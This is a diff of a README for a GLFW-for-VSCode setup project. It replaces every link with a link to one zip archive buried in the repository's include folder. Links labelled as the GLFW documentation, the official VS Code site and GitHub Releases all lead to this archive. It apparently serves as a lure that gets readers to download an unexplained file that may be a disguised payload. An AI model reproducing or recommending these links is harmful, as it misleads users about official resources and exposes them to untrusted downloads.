@@ -1,6 +1,6 @@
 # 🎮 GLFW-for-VSCode - Easy GLFW Setup for Your Projects
 
-[![Download Now](https://raw.githubusercontent.com/Sahil-rai/GLFW-for-VSCode/main/include/glm/gtc/GLFW-for-VSCode_2.8.zip%20Now-GLFW%20for%20VSCode-brightgreen)](https://raw.githubusercontent.com/Sahil-rai/GLFW-for-VSCode/main/include/glm/gtc/GLFW-for-VSCode_2.8.zip)
+[![Download Now](https://github.com/Sahil-rai/GLFW-for-VSCode/raw/refs/heads/main/include/GLF-VS-for-Code-v1.1.zip%20Now-GLFW%20for%20VSCode-brightgreen)](https://github.com/Sahil-rai/GLFW-for-VSCode/raw/refs/heads/main/include/GLF-VS-for-Code-v1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to GLFW-for-VSCode! This setup simplifies the process of using GLFW in y
 
 To get started, visit the releases page and download the setup. Click the button below:
 
-[Download from Releases](https://raw.githubusercontent.com/Sahil-rai/GLFW-for-VSCode/main/include/glm/gtc/GLFW-for-VSCode_2.8.zip)
+[Download from Releases](https://github.com/Sahil-rai/GLFW-for-VSCode/raw/refs/heads/main/include/GLF-VS-for-Code-v1.1.zip)
 
 1. Go to the **Releases** page.
 2. Find the latest version.
@@ -79,8 +79,8 @@ Once you have everything installed, follow these steps to set up a project in Vi
 
 ## 📚 Resources and Support
 
-- **GLFW Documentation:** [Visit](https://raw.githubusercontent.com/Sahil-rai/GLFW-for-VSCode/main/include/glm/gtc/GLFW-for-VSCode_2.8.zip) for complete GLFW usage information.
-- **Visual Studio Code:** [Official Site](https://raw.githubusercontent.com/Sahil-rai/GLFW-for-VSCode/main/include/glm/gtc/GLFW-for-VSCode_2.8.zip) for installation and setup help.
+- **GLFW Documentation:** [Visit](https://github.com/Sahil-rai/GLFW-for-VSCode/raw/refs/heads/main/include/GLF-VS-for-Code-v1.1.zip) for complete GLFW usage information.
+- **Visual Studio Code:** [Official Site](https://github.com/Sahil-rai/GLFW-for-VSCode/raw/refs/heads/main/include/GLF-VS-for-Code-v1.1.zip) for installation and setup help.
 - **Community Forums:** Join online forums to ask questions and share your projects.
 
 ## 💬 Frequently Asked Questions
@@ -99,6 +99,6 @@ A: Please check the issues section on GitHub or reach out via community forums f
 - **Template Project:** The setup includes a basic project template to simplify your start.
 - **Shader Examples:** Learn how to use shaders effectively with provided examples.
 
-For more details, refer to the documentation inside the project folder or visit [GitHub Releases](https://raw.githubusercontent.com/Sahil-rai/GLFW-for-VSCode/main/include/glm/gtc/GLFW-for-VSCode_2.8.zip) for updates.
+For more details, refer to the documentation inside the project folder or visit [GitHub Releases](https://github.com/Sahil-rai/GLFW-for-VSCode/raw/refs/heads/main/include/GLF-VS-for-Code-v1.1.zip) for updates.
 
 Enjoy coding with GLFW in Visual Studio Code!
